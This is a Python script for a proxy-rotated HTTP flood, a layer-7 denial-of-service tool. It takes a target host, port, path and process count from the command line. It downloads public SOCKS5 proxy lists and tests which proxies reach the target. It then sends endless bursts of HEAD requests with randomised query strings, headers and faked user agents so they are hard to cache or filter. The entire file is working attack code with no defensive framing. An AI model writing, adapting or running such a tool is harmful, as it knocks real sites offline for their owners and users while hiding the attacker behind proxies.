import ssl, threading
import multiprocessing
import socket
import random
import time
import sys
import socks # pysocks
import requests # requests
from fake_useragent import UserAgent # fake-useragent

# Init

targetHost = sys.argv[1]
targetPort = int(sys.argv[2])
threadNumber = int(sys.argv[3])
targetPath = sys.argv[4]
rI = random.randint
proxyFile = "socks5.txt"
rC = random.choice
queryParams = [
    "s",
    "a",
    "q",
    "id",
    "page",
    "search",
    "controller",
    "language",
    "data",
    "field"
]
proxyResources = [
    'https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5&timeout=10000&country=all',
    'https://www.proxy-list.download/api/v1/get?type=socks5',
    'https://www.proxyscan.io/download?type=socks5',
]

AcceptHeaders = [
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
        "Accept-Encoding: gzip, deflate\r\n",
        "Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
        "Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n",
        "Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
        "Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
        "Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
        "Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Encoding: gzip\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n,"
        "Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n",
        "Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
        "Accept: text/html, application/xhtml+xml",
        "Accept-Language: en-US,en;q=0.5\r\n",
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n",
        "Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n"
]

connectProxyHeader = "GET / HTTP/1.1\r\nHost: {}\r\n\r\n".format(targetHost)

def socksCrawler():
    global socksFile, socksResources
    f = open(proxyFile, "wb")
    for url in proxyResources:
        try:
            f.write(requests.get(url).content)
        except:
            pass
    f.close()


def connectProxy(proxy):
    global liveProxies
    proxySplit = proxy.strip().split(":")
    s = socks.socksocket()
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.set_proxy(socks.SOCKS5, str(proxySplit[0]), int(proxySplit[1]))
    s.settimeout(10)
    try:
        s.connect((targetHost, targetPort))
        if targetPort == 443:
            s = ssl.create_default_context().wrap_socket(s, server_hostname = targetHost)
        s.send(str(connectProxyHeader).encode())
        print("Connected successfully " + proxySplit[0] + ":" + proxySplit[1])
    except:
        proxies.remove(proxy)
        print("Disconnected " + proxySplit[0] + ":" + proxySplit[1])
def checkProxies():
    global liveProxies
    threadList = []
    for proxy in proxies:
        thread = threading.Thread(target = connectProxy, args = (proxy, ))
        thread.start()
        threadList.append(thread)
        sys.stdout.flush()
    for thread in threadList:
        thread.join()
        sys.stdout.flush()
    f = open(proxyFile, "w")
    for proxy in proxies:
        f.write(proxy)
    f.close()

time.sleep(1)

# Xoa darkdarkbruhbruhlmaolmao neu muon dung Process Class
def Flood(darkdarkbruhbruhlmaolmao):
    proxy = rC(proxies).strip().split(":")
    Connection = "Connection: Keep-Alive\r\n"
    Accept = rC(AcceptHeaders)
    User_Agent = "User-Agent: " + rC(userAgentList) + "\r\n\r\n"
    while True:
        try:
            s = socks.socksocket()
            s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            s.connect((targetHost, targetPort))
            if targetPort == 443:
                sslContext = ssl.SSLContext()
                s = sslContext.wrap_socket(s, server_hostname=targetHost)
            for _ in range(100):
                valueParams = "?{}={}".format(rC(queryParams), rI(1, 65535))
                floodHeader = "HEAD {}{} HTTP/1.1\r\nHost: {}\r\n".format(targetPath, valueParams, targetHost) + Connection + Accept + User_Agent
                floodHeader = floodHeader.encode()
                s.send(floodHeader)
            print("Flood sent " + proxy[0] + ":" + proxy[1])
        except:
            pass

if "--socksCrawler" in sys.argv:
    socksCrawler()
else:
    pass

if "--useMyFile" in sys.argv:
    proxyFile = input("Your file: ")
    proxies = open(proxyFile).readlines()
else:
    proxies = open("socks5.txt").readlines()

if "--checkProxies" in sys.argv:
    proxies = open(proxyFile).readlines()
    checkProxies()
else:
    proxies = open("socks5.txt").readlines()
userAgentList = []
for _ in range(100):
    userAgent = UserAgent().random
    userAgentList.append(userAgent)
"""processList = []
for indexPicker in range(threadNumber):
    process = multiprocessing.Process(target=Flood)
    process.Daemon = True
    processList.append(process)
    process.start()
for process in processList:
    process.join()"""
darkdarkbruhbruhlmaolmao = multiprocessing.Pool(processes=threadNumber)
darkdarkbruhbruhlmaolmao.map(Flood, range(500))
"""while True:
    input()"""
